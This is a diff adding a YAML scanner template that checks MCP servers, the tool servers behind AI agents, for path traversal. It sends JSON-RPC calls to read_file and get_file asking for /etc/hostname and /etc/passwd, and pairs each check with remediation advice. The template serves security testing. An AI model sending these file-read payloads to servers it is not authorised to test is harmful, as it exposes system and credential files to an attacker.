@@ -1,0 +1,132 @@
+id: mcp-path-001-read-file-traversal
+transport: mcp
+info:
+  name: "MCP Server - Path Traversal via File Read Tool"
+  type: exploit
+  severity: high
+  author: aipostex
+  description: |
+    MCP server exposes a file reading tool (read_file, get_file, file_read,
+    or read_resource) that accepts arbitrary filesystem paths without
+    restricting access to a safe directory. An attacker can read any file
+    accessible to the MCP server process, including credentials, private
+    keys, and application configuration.
+  reference:
+    - https://vulnerablemcp.info/
+    - https://equixly.com/blog/2025/03/29/mcp-server-new-security-nightmare/
+  tags: [mcp, path-traversal, lfi]
+  classification:
+    mitre-atlas: [AML.T0049]
+
+detect:
+  - method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(read_file|get_file|file_read|read_resource)"
+
+checks:
+  - name: "File read tool available"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(read_file|get_file|file_read|read_resource)"
+    extractors:
+      - type: json
+        name: tool_names
+        path: "result.tools.#.name"
+    severity: medium
+    stage: access
+    landed: reachable
+    finding:
+      title: "MCP Server Exposes File Read Tool"
+      description: "MCP server exposes a file reading tool among: {{tool_names}}. Without path validation, this enables arbitrary file reads."
+      remediation: "Restrict file access to an explicit allowlist of directories. Reject paths containing '..' or absolute paths outside the allowed root."
+
+  - name: "read_file accepts absolute path /etc/hostname (no access-denied)"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"/etc/hostname"}},"id":2}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "\"error\""
+      - type: body_not_contains
+        value: "denied"
+      - type: body_not_contains
+        value: "not allowed"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "MCP read_file Accepts Out-of-Sandbox Absolute Path"
+      description: "The read_file tool accepted the absolute path /etc/hostname (outside any sandbox) and returned a 200 with no access-denied error, indicating path validation is absent. Note: this check confirms only the absence of an error, not the file content itself — see the /etc/passwd check for content-confirmed arbitrary read."
+      remediation: "Implement path validation with an allowlist of permitted directories. Block absolute paths and directory traversal sequences."
+      evidence: |
+        Payload:  tools/call read_file {"path":"/etc/hostname"}
+        Result:   HTTP 200 with no error/denied/not-allowed (absolute path accepted; content not asserted)
+        Impact:   Missing path validation; likely arbitrary file read (content-confirmed via /etc/passwd check)
+
+  - name: "Path traversal confirmed via read_file on /etc/passwd"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"/etc/passwd"}},"id":3}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "root:"
+    severity: high
+    stage: impact
+    landed: read-confirmed
+    finding:
+      title: "MCP Path Traversal: read_file Reads /etc/passwd"
+      description: "The read_file tool returned contents of /etc/passwd, confirming unrestricted filesystem access. User account enumeration and credential file exfiltration are possible."
+      remediation: "Implement path validation with an allowlist of permitted directories. Block absolute paths and directory traversal sequences."
+      evidence: |
+        Payload:  tools/call read_file {"path":"/etc/passwd"}
+        Result:   Response contained "root:" — /etc/passwd content returned
+        Impact:   User enumeration, credential file access, lateral movement
+
+  - name: "get_file accepts absolute path /etc/hostname (no access-denied)"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_file","arguments":{"path":"/etc/hostname"}},"id":4}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "\"error\""
+      - type: body_not_contains
+        value: "denied"
+      - type: body_not_contains
+        value: "not allowed"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "MCP get_file Accepts Out-of-Sandbox Absolute Path"
+      description: "The get_file tool accepted the absolute path /etc/hostname (outside any sandbox) and returned a 200 with no access-denied error, indicating path validation is absent. This check confirms only the absence of an error, not the file content."
+      remediation: "Implement path validation with an allowlist of permitted directories."
+      evidence: |
+        Payload:  tools/call get_file {"path":"/etc/hostname"}
+        Result:   HTTP 200 with no error/denied/not-allowed (absolute path accepted; content not asserted)
+        Impact:   Missing path validation; likely arbitrary file read
